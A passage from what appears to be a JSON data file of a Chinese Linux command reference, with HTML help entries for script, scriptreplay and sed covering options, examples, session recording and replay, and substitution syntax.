   <span class=\"hljs-comment\"># 只运行 command 命令而不打开交互终端。相当于开启 script ，执行 command ，再退出 script</span>\n                          <span class=\"hljs-comment\"># command 可以是任意能够在终端会话执行的命令</span>\n-e, <span class=\"hljs-params\">--return</span>              <span class=\"hljs-comment\"># 返回子进程的退出状态码</span>\n-f, <span class=\"hljs-params\">--flush</span>               <span class=\"hljs-comment\"># 每次终端的内容发生变动，立马写入日志文件</span>\n<span class=\"hljs-params\">--force</span>                   <span class=\"hljs-comment\"># 允许默认输出终端数据文件为符号链接</span>\n-o, <span class=\"hljs-params\">--output-limit</span> size   <span class=\"hljs-comment\"># 限制终端数据文件和时间日志文件的大小，当文件大小达到此限制就会退出子进程</span>\n                          <span class=\"hljs-comment\"># size 的单位可以设置为：KiB(=1024)、KB(=1000)、MiB(1024*1024)、MB(=1000*1000)</span>\n                          <span class=\"hljs-comment\"># 同理还支持 GiB TiB PiB EiB ZiB YiB GB TB PB EB ZB YB</span>\n-q, <span class=\"hljs-params\">--quiet</span>               <span class=\"hljs-comment\"># 安静模式。启动和退出script命令不显示任何提示</span>\n-t[file], <span class=\"hljs-params\">--timing</span>[=file] <span class=\"hljs-comment\"># 输出时间日志信息到标准错误(stderr)或者文件</span>\n-V, <span class=\"hljs-params\">--version</span>             <span class=\"hljs-comment\"># 显示版本信息并退出</span>\n-h, <span class=\"hljs-params\">--help</span>                <span class=\"hljs-comment\"># 显示帮助文本并退出</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>终端数据文件：设置存储终端数据信息的文件名称</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">script</span>                             <span class=\"hljs-comment\"># 开启记录，默认会在当前目录创建名称为 typescript 的文件来保存终端数据文件</span>\n<span class=\"hljs-keyword\">script</span> command.<span class=\"hljs-built_in\">log</span>                 <span class=\"hljs-comment\"># 开启记录，在当前目录创建名称为 command.log 的文件来保存终端数据文件</span>\n<span class=\"hljs-keyword\">script</span> -t <span class=\"hljs-number\">2</span>&gt;<span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">file</span> command.<span class=\"hljs-built_in\">log</span>  <span class=\"hljs-comment\"># 开启记录，在当前目录创建名称为 command.log 的文件来保存终端数据文件</span>\n                                   <span class=\"hljs-comment\"># 在当前目录创建名称为 time.file 的文件来保存时间日志文件</span>\n</code></pre>\n<p> <strong>以追加模式记录终端信息</strong> </p>\n<pre><code class=\"language-shell\">zfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>script -t <span class=\"hljs-number\">2</span>&gt;time.file -a -f command.log\nScript started, file is command.log\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>echo <span class=\"hljs-string\">\"hello, world\"</span>\nhello, world\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>echo <span class=\"hljs-variable\">$(</span>date <span class=\"hljs-string\">\"+%Y-%m-%d %H:%M:%S\"</span>)\n<span class=\"hljs-number\">2020</span><span class=\"hljs-number\">-12</span><span class=\"hljs-number\">-23</span> <span class=\"hljs-number\">20</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">48</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">46</span>\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>echo <span class=\"hljs-string\">\"Bye\"</span>\nBye\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>ls -al\ntotal <span class=\"hljs-number\">20</span>\ndrwxr-xr-x  <span class=\"hljs-number\">2</span> zfb zfb <span class=\"hljs-number\">4096</span> Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">20</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">48</span> .\ndrwxr-xr-x <span class=\"hljs-number\">37</span> zfb zfb <span class=\"hljs-number\">4096</span> Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">20</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">49</span> ..\n-rw-r--r--  <span class=\"hljs-number\">1</span> zfb zfb    0 Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">19</span><span class=\"hljs-symbol\">:</span>03 a.txt\n-rw-r--r--  <span class=\"hljs-number\">1</span> zfb zfb   <span class=\"hljs-number\">12</span> Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">19</span><span class=\"hljs-symbol\">:</span>04 b.txt\n-rw-r--r--  <span class=\"hljs-number\">1</span> zfb zfb <span class=\"hljs-number\">2744</span> Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">20</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">49</span> command.log\n-rw-r--r--  <span class=\"hljs-number\">1</span> zfb zfb  <span class=\"hljs-number\">790</span> Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">20</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">49</span> time.file\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>exit\nScript done, file is command.log\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span>$\n</code></pre>\n<p>然后，用户可以查看终端数据文件，使用方法如下  </p>\n<pre><code class=\"language-shell\">zfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>cat command.log\nScript started on <span class=\"hljs-number\">2020</span><span class=\"hljs-number\">-12</span><span class=\"hljs-number\">-23</span> <span class=\"hljs-number\">20</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">48</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">25</span>+08<span class=\"hljs-symbol\">:</span>00 [TERM=<span class=\"hljs-string\">\"xterm-256color\"</span> TTY=<span class=\"hljs-string\">\"/dev/pts/0\"</span> COLUMNS=<span class=\"hljs-string\">\"75\"</span> LINES=<span class=\"hljs-string\">\"30\"</span>]\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>echo <span class=\"hljs-string\">\"hello, world\"</span>\nhello, world\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>echo <span class=\"hljs-variable\">$(</span>date <span class=\"hljs-string\">\"+%Y-%m-%d %H:%M:%S\"</span>)\n<span class=\"hljs-number\">2020</span><span class=\"hljs-number\">-12</span><span class=\"hljs-number\">-23</span> <span class=\"hljs-number\">20</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">48</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">46</span>\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>echo <span class=\"hljs-string\">\"Bye\"</span>\nBye\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>ls -al\ntotal <span class=\"hljs-number\">20</span>\ndrwxr-xr-x  <span class=\"hljs-number\">2</span> zfb zfb <span class=\"hljs-number\">4096</span> Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">20</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">48</span> .\ndrwxr-xr-x <span class=\"hljs-number\">37</span> zfb zfb <span class=\"hljs-number\">4096</span> Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">20</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">49</span> ..\n-rw-r--r--  <span class=\"hljs-number\">1</span> zfb zfb    0 Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">19</span><span class=\"hljs-symbol\">:</span>03 a.txt\n-rw-r--r--  <span class=\"hljs-number\">1</span> zfb zfb   <span class=\"hljs-number\">12</span> Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">19</span><span class=\"hljs-symbol\">:</span>04 b.txt\n-rw-r--r--  <span class=\"hljs-number\">1</span> zfb zfb <span class=\"hljs-number\">2744</span> Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">20</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">49</span> command.log\n-rw-r--r--  <span class=\"hljs-number\">1</span> zfb zfb  <span class=\"hljs-number\">790</span> Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">20</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">49</span> time.file\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>exit\n\nScript done on <span class=\"hljs-number\">2020</span><span class=\"hljs-number\">-12</span><span class=\"hljs-number\">-23</span> <span class=\"hljs-number\">20</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">49</span><span class=\"hljs-symbol\">:</span>04+08<span class=\"hljs-symbol\">:</span>00 [COMMAND_EXIT_CODE=<span class=\"hljs-string\">\"0\"</span>]\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span>$\n</code></pre>\n<p>其中，只有命令<code>cat command.log</code>是用户输入，其他均为自动呈现。通过查看上面输出的时间<code>2020-12-23 20:48:46</code>，可以证明，这是重现的记录，而非重新执行一遍命令。也就是说，可以把<code>time.file</code>和<code>command.log</code>文件移动到任意一台机器上，都可以重现命令输入与终端回显。</p>\n<p> <strong>记录服务器用户会话操作</strong> </p>\n<p>以<code>root</code>身份编辑文件<code>/etc/profile</code>，在文件末尾追加以下内容</p>\n<pre><code class=\"language-bash\"><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-variable\">$UID</span> -ge <span class=\"hljs-number\">0</span> ]\nthen\n    exec <span class=\"hljs-regexp\">/usr/</span>bin<span class=\"hljs-regexp\">/script -t 2&gt;/</span>var<span class=\"hljs-regexp\">/log/</span>script-records<span class=\"hljs-regexp\">/$USER-$UID-`date +%Y%m%d`.time -a -f -q /</span>var<span class=\"hljs-regexp\">/log/</span>script-records/<span class=\"hljs-variable\">$USER</span>-<span class=\"hljs-variable\">$UID</span>-`date +%Y%m%d`.log\nfi\n</code></pre>\n<p>然后再以<code>root</code>身份创建文件夹用于存储服务器上的各个用户在终端的所有操作信息</p>\n<pre><code class=\"language-bash\">sudo mkdir -p <span class=\"hljs-regexp\">/var/</span>log<span class=\"hljs-regexp\">/script-records/</span>\nsudo chmod <span class=\"hljs-number\">733</span> <span class=\"hljs-regexp\">/var/</span>log<span class=\"hljs-regexp\">/script-records/</span>\n</code></pre>\n<p>最后，执行命令<code>source /etc/profile</code>即可。任意用户（<code>UID ≥ 0</code>）在终端执行的所有操作都会被安静地记录下来，以天为单位存储。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "scriptreplay",
        "des": "重新播放终端会话的所有操作",
        "body": "<h1 id=\"scriptreplay\">scriptreplay</h1>\n<p>重新播放终端会话的所有操作</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>scriptreplay</strong> 用于在终端中，根据 <code>script</code> 命令记录的终端数据文件和时间日志文件，重现当时用户的所有操作和命令的输出信息。简而言之，重现播放当时终端会话发生的一切信息，而不是重新运行一遍命令。例如，用户当时在输入某条命令时，字符的键入和删除也都会被重现。非常适合用于教程演示场合。而且，在机器 A 上面使用 <code>script</code> 命令记录终端操作，可以在机器 B 上面使用 <code>scriptreplay</code> 命令重新播放。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">scriptreplay <span class=\"hljs-comment\">[options]</span> <span class=\"hljs-comment\">[-t]</span> timingfile <span class=\"hljs-comment\">[typescript <span class=\"hljs-comment\">[divisor]</span>]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-<span class=\"hljs-string\">t</span>, <span class=\"hljs-built_in\">--timing</span> <span class=\"hljs-string\">file</span>         <span class=\"hljs-comment\"># 记录时间日志的文件名称</span>\n-<span class=\"hljs-string\">s</span>, <span class=\"hljs-built_in\">--typescript</span> <span class=\"hljs-string\">file</span>     <span class=\"hljs-comment\"># 记录终端数据信息的日志文件名称</span>\n-<span class=\"hljs-string\">d</span>, <span class=\"hljs-built_in\">--divisor</span> <span class=\"hljs-string\">number</span>      <span class=\"hljs-comment\"># 表示倍速播放，把时间日志文件记录的时间间隔都除以 number</span>\n                          <span class=\"hljs-comment\"># -d 2 表示播放速度是原始输入单条命令的速度的两倍，-d 0.1 表示播放单条命令的速度减慢 10 倍</span>\n-<span class=\"hljs-string\">m</span>, <span class=\"hljs-built_in\">--maxdelay</span> <span class=\"hljs-string\">number</span>     <span class=\"hljs-comment\"># 表示命令之间的最大延迟时间（单位是秒）</span>\n                          <span class=\"hljs-comment\"># -m 2 表示 command.log 中存放的两条命令之间的间隔时间如果大于两秒，则按两秒执行播放</span>\n-<span class=\"hljs-string\">V</span>, <span class=\"hljs-built_in\">--version</span>             <span class=\"hljs-comment\"># 显示版本信息并退出</span>\n-<span class=\"hljs-string\">h</span>, <span class=\"hljs-built_in\">--help</span>                <span class=\"hljs-comment\"># 显示帮助文本并退出</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>时间日志文件：存储时间日志信息的文件名称</li>\n<li>终端数据文件：存储终端数据信息的文件名称</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 重新播放终端内容，默认第一个参数是时间日志，第二个参数是终端数据文件</span>\nscriptreplay <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">file</span> command.<span class=\"hljs-built_in\">log</span>\n<span class=\"hljs-comment\"># 重新播放终端内容，播放快进速度为 1 ，命令之间最大延时为 2 秒</span>\nscriptreplay -d <span class=\"hljs-number\">1</span> -m <span class=\"hljs-number\">2</span> -t <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">file</span> -s command.<span class=\"hljs-built_in\">log</span>\n</code></pre>\n<p> <strong>记录终端内容到文件</strong> </p>\n<pre><code class=\"language-shell\">zfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>script -t <span class=\"hljs-number\">2</span>&gt;time.file -a -f command.log\nScript started, file is command.log\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>echo <span class=\"hljs-string\">\"hello, world\"</span>\nhello, world\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>echo <span class=\"hljs-variable\">$(</span>date <span class=\"hljs-string\">\"+%Y-%m-%d %H:%M:%S\"</span>)\n<span class=\"hljs-number\">2020</span><span class=\"hljs-number\">-12</span><span class=\"hljs-number\">-23</span> <span class=\"hljs-number\">20</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">48</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">46</span>\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>echo <span class=\"hljs-string\">\"Bye\"</span>\nBye\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>ls -al\ntotal <span class=\"hljs-number\">20</span>\ndrwxr-xr-x  <span class=\"hljs-number\">2</span> zfb zfb <span class=\"hljs-number\">4096</span> Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">20</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">48</span> .\ndrwxr-xr-x <span class=\"hljs-number\">37</span> zfb zfb <span class=\"hljs-number\">4096</span> Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">20</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">49</span> ..\n-rw-r--r--  <span class=\"hljs-number\">1</span> zfb zfb    0 Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">19</span><span class=\"hljs-symbol\">:</span>03 a.txt\n-rw-r--r--  <span class=\"hljs-number\">1</span> zfb zfb   <span class=\"hljs-number\">12</span> Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">19</span><span class=\"hljs-symbol\">:</span>04 b.txt\n-rw-r--r--  <span class=\"hljs-number\">1</span> zfb zfb <span class=\"hljs-number\">2744</span> Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">20</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">49</span> command.log\n-rw-r--r--  <span class=\"hljs-number\">1</span> zfb zfb  <span class=\"hljs-number\">790</span> Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">20</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">49</span> time.file\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>exit\nScript done, file is command.log\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span>$\n</code></pre>\n<p> <strong>重新播放终端内容</strong> </p>\n<pre><code class=\"language-shell\">zfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>scriptreplay -d <span class=\"hljs-number\">1</span> -m <span class=\"hljs-number\">2</span> -t time.file -s command.log\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>echo <span class=\"hljs-string\">\"hello, world\"</span>\nhello, world\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>echo <span class=\"hljs-variable\">$(</span>date <span class=\"hljs-string\">\"+%Y-%m-%d %H:%M:%S\"</span>)\n<span class=\"hljs-number\">2020</span><span class=\"hljs-number\">-12</span><span class=\"hljs-number\">-23</span> <span class=\"hljs-number\">20</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">48</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">46</span>\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>echo <span class=\"hljs-string\">\"Bye\"</span>\nBye\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>ls -al\ntotal <span class=\"hljs-number\">20</span>\ndrwxr-xr-x  <span class=\"hljs-number\">2</span> zfb zfb <span class=\"hljs-number\">4096</span> Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">20</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">48</span> .\ndrwxr-xr-x <span class=\"hljs-number\">37</span> zfb zfb <span class=\"hljs-number\">4096</span> Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">20</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">49</span> ..\n-rw-r--r--  <span class=\"hljs-number\">1</span> zfb zfb    0 Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">19</span><span class=\"hljs-symbol\">:</span>03 a.txt\n-rw-r--r--  <span class=\"hljs-number\">1</span> zfb zfb   <span class=\"hljs-number\">12</span> Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">19</span><span class=\"hljs-symbol\">:</span>04 b.txt\n-rw-r--r--  <span class=\"hljs-number\">1</span> zfb zfb <span class=\"hljs-number\">2744</span> Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">20</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">49</span> command.log\n-rw-r--r--  <span class=\"hljs-number\">1</span> zfb zfb  <span class=\"hljs-number\">790</span> Dec <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">20</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">49</span> time.file\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>exit\n\nzfb<span class=\"hljs-variable\">@localhost</span><span class=\"hljs-symbol\">:~</span>$\n</code></pre>\n<p>其中，只有命令<code>scriptreplay -d 1 -m 2 -t time.file -s command.log</code>是用户输入，其他均为自动呈现（且视觉效果与真实用户的操作一致）。通过查看上面输出的时间<code>2020-12-23 20:48:46</code>，可以证明，这是重新播放当时的记录，而非重新执行一遍命令。也就是说，可以把<code>time.file</code>和<code>command.log</code>文件移动到任意一台支持<code>scriptreplay</code>命令的机器上，都可以动态重现命令输入与终端回显。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "sed",
        "des": "功能强大的流式文本编辑器",
        "body": "<h1 id=\"sed\">sed</h1>\n<p>功能强大的流式文本编辑器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>sed</strong> 是一种流编辑器，它是文本处理中非常重要的工具，能够完美的配合正则表达式使用，功能不同凡响。处理时，把当前处理的行存储在临时缓冲区中，称为“模式空间”（pattern space），接着用sed命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送往屏幕。接着处理下一行，这样不断重复，直到文件末尾。文件内容并没有 改变，除非你使用重定向存储输出。Sed主要用来自动编辑一个或多个文件；简化对文件的反复操作；编写转换程序等。</p>\n<h2 id=\"sed的选项、命令、替换标记\">sed的选项、命令、替换标记</h2>\n<p> <strong>命令格式</strong> </p>\n<pre><code class=\"language-shell\">sed [<span class=\"hljs-keyword\">options</span>] <span class=\"hljs-string\">'command'</span> <span class=\"hljs-keyword\">file</span>(s)\nsed [<span class=\"hljs-keyword\">options</span>] -f scriptfile <span class=\"hljs-keyword\">file</span>(s)\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-e&lt;<span class=\"hljs-keyword\">script</span>&gt;或<span class=\"hljs-comment\">--expression=&lt;script&gt;：以选项中的指定的script来处理输入的文本文件；</span>\n-f&lt;<span class=\"hljs-keyword\">script</span>文件&gt;或<span class=\"hljs-comment\">--file=&lt;script文件&gt;：以选项中指定的script文件来处理输入的文本文件；</span>\n-h或<span class=\"hljs-comment\">--help：显示帮助；</span>\n-n或<span class=\"hljs-comment\">--quiet或——silent：仅显示script处理后的结果；</span>\n-V或<span class=\"hljs-comment\">--version：显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定待处理的文本文件列表。</p>\n<h3 id=\"sed命令\">sed命令</h3>\n<pre><code class=\"language-shell\">a\\ <span class=\"hljs-comment\"># 在当前行下面插入文本。</span>\ni\\ <span class=\"hljs-comment\"># 在当前行上面插入文本。</span>\nc\\ <span class=\"hljs-comment\"># 把选定的行改为新的文本。</span>\nd <span class=\"hljs-comment\"># 删除，删除选择的行。</span>\nD <span class=\"hljs-comment\"># 删除模板块的第一行。</span>\ns <span class=\"hljs-comment\"># 替换指定字符</span>\nh <span class=\"hljs-comment\"># 拷贝模板块的内容到内存中的缓冲区。</span>\nH <span class=\"hljs-comment\"># 追加模板块的内容到内存中的缓冲区。</span>\ng <span class=\"hljs-comment\"># 获得内存缓冲区的内容，并替代当前模板块中的文本。</span>\nG <span class=\"hljs-comment\"># 获得内存缓冲区的内容，并追加到当前模板块文本的后面。</span>\nl <span class=\"hljs-comment\"># 列表不能打印字符的清单。</span>\nn <span class=\"hljs-comment\"># 读取下一个输入行，用下一个命令处理新的行而不是用第一个命令。</span>\nN <span class=\"hljs-comment\"># 追加下一个输入行到模板块后面并在二者间嵌入一个新行，改变当前行号码。</span>\np <span class=\"hljs-comment\"># 打印模板块的行。</span>\nP <span class=\"hljs-comment\"># (大写) 打印模板块的第一行。</span>\nq <span class=\"hljs-comment\"># 退出Sed。</span>\nb lable <span class=\"hljs-comment\"># 分支到脚本中带有标记的地方，如果分支不存在则分支到脚本的末尾。</span>\nr <span class=\"hljs-built_in\">file</span> <span class=\"hljs-comment\"># 从file中读行。</span>\nt label <span class=\"hljs-comment\"># if分支，从最后一行开始，条件一旦满足或者T，t命令，将导致分支到带有标号的命令处，或者到脚本的末尾。</span>\nT label <span class=\"hljs-comment\"># 错误分支，从最后一行开始，一旦发生错误或者T，t命令，将导致分支到带有标号的命令处，或者到脚本的末尾。</span>\nw <span class=\"hljs-built_in\">file</span> <span class=\"hljs-comment\"># 写并追加模板块到file末尾。  </span>\nW <span class=\"hljs-built_in\">file</span> <span class=\"hljs-comment\"># 写并追加模板块的第一行到file末尾。  </span>\n! <span class=\"hljs-comment\"># 表示后面的命令对所有没有被选定的行发生作用。  </span>\n= <span class=\"hljs-comment\"># 打印当前行号码。  </span>\n<span class=\"hljs-comment\"># # 把注释扩展到下一个换行符以前。  </span>\n</code></pre>\n<h3 id=\"sed替换标记\">sed替换标记</h3>\n<pre><code class=\"language-shell\">g <span class=\"hljs-comment\"># 表示行内全面替换。  </span>\np <span class=\"hljs-comment\"># 表示打印行。  </span>\nw <span class=\"hljs-comment\"># 表示把行写入一个文件。  </span>\nx <span class=\"hljs-comment\"># 表示互换模板块中的文本和缓冲区中的文本。  </span>\ny <span class=\"hljs-comment\"># 表示把一个字符翻译为另外的字符（但是不用于正则表达式）</span>\n<span class=\"hljs-string\">\\1</span> <span class=\"hljs-comment\"># 子串匹配标记</span>\n&amp; <span class=\"hljs-comment\"># 已匹配字符串标记</span>\n</code></pre>\n<h3 id=\"sed元字符集\">sed元字符集</h3>\n<pre><code class=\"language-shell\">^ <span class=\"hljs-comment\"># 匹配行开始，如：/^sed/匹配所有以sed开头的行。</span>\n$ <span class=\"hljs-comment\"># 匹配行结束，如：/sed$/匹配所有以sed结尾的行。</span>\n. <span class=\"hljs-comment\"># 匹配一个非换行符的任意字符，如：/s.d/匹配s后接一个任意字符，最后是d。</span>\n* <span class=\"hljs-comment\"># 匹配0个或多个字符，如：/*sed/匹配所有模板是一个或多个空格后紧跟sed的行。</span>\n[] <span class=\"hljs-comment\"># 匹配一个指定范围内的字符，如/[sS]ed/匹配sed和Sed。  </span>\n[^] <span class=\"hljs-comment\"># 匹配一个不在指定范围内的字符，如：/[^A-RT-Z]ed/匹配不包含A-R和T-Z的一个字母开头，紧跟ed的行。</span>\n<span class=\"hljs-string\">\\(..\\)</span> <span class=\"hljs-comment\"># 匹配子串，保存匹配的字符，如s/\\(love\\)able/\\1rs，loveable被替换成lovers。</span>\n&amp; <span class=\"hljs-comment\"># 保存搜索字符用来替换其他字符，如s/love/ **&amp;** /，love这成 **love** 。</span>\n<span class=\"hljs-string\">\\&lt;</span> <span class=\"hljs-comment\"># 匹配单词的开始，如:/\\&lt;love/匹配包含以love开头的单词的行。</span>\n<span class=\"hljs-string\">\\&gt;</span> <span class=\"hljs-comment\"># 匹配单词的结束，如/love\\&gt;/匹配包含以love结尾的单词的行。</span>\nx<span class=\"hljs-string\">\\{m\\}</span> <span class=\"hljs-comment\"># 重复字符x，m次，如：/0\\{5\\}/匹配包含5个0的行。</span>\nx<span class=\"hljs-string\">\\{m,\\}</span> <span class=\"hljs-comment\"># 重复字符x，至少m次，如：/0\\{5,\\}/匹配至少有5个0的行。</span>\nx<span class=\"hljs-string\">\\{m,n\\}</span> <span class=\"hljs-comment\"># 重复字符x，至少m次，不多于n次，如：/0\\{5,10\\}/匹配5~10个0的行。  </span>\n</code></pre>\n<h2 id=\"sed用法实例\">sed用法实例</h2>\n<h3 id=\"替换操作：s命令\">替换操作：s命令</h3>\n<p>替换文本中的字符串：</p>\n<pre><code class=\"language-shell\">sed <span class=\"hljs-string\">'s/book/books/'</span> <span class=\"hljs-keyword\">file</span>\n</code></pre>\n<p> <strong>-n选项</strong> 和 <strong>p命令</strong> 一起使用表示只打印那些发生替换的行：</p>\n<p>sed -n 's/test/TEST/p' file</p>\n<p>直接编辑文件 <strong>选项-i</strong> ，会匹配file文件中每一行的所有book替换为books：</p>\n<pre><code class=\"language-shell\">sed -i <span class=\"hljs-string\">'s/book/books/g'</span> <span class=\"hljs-keyword\">file</span>\n</code></pre>\n<h3 id=\"全面替换标记g\">全面替换标记g</h3>\n<p>使用后缀 /g 标记会替换每一行中的所有匹配：</p>\n<pre><code class=\"language-shell\">sed <span class=\"hljs-string\">'s/book/books/g'</span> <span class=\"hljs-keyword\">file</span>\n</code></pre>\n<p>当需要从第N处匹配开始替换时，可以使用 /Ng：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">echo</span> sksksksksksk | sed <span class=\"hljs-string\">'s/sk/SK/2g'</span>\nskSKSKSKSKSK\n\n<span class=\"hljs-built_in\">echo</span> sksksksksksk | sed <span class=\"hljs-string\">'s/sk/SK/3g'</span>\nskskSKSKSKSK\n\n<span class=\"hljs-built_in\">echo</span> sksksksksksk | sed <span class=\"hljs-string\">'s/sk/SK/4g'</span>\nskskskSKSKSK\n</code></pre>\n<h3 id=\"定界符\">定界符</h3>\n<p>以上命令中字符 / 在sed中作为定界符使用，也可以使用任意的定界符：</p>\n<pre><code class=\"language-shell\">sed <span class=\"hljs-symbol\">'s</span>:test:<span class=\"hljs-type\">TEXT</span>:g'\nsed <span class=\"hljs-symbol\">'s</span>|test|<span class=\"hljs-type\">TEXT</span>|g'\n</code></pre>\n<p>定界符出现在样式内部时，需要进行转义：</p>\n<pre><code class=\"language-shell\">sed 's/\\<span class=\"hljs-string\">/bin/</span>\\<span class=\"hljs-string\">/usr</span>\\<span class=\"hljs-string\">/local</span>\\<span class=\"hljs-string\">/bin/g</span>'\n</code></pre>\n<h3 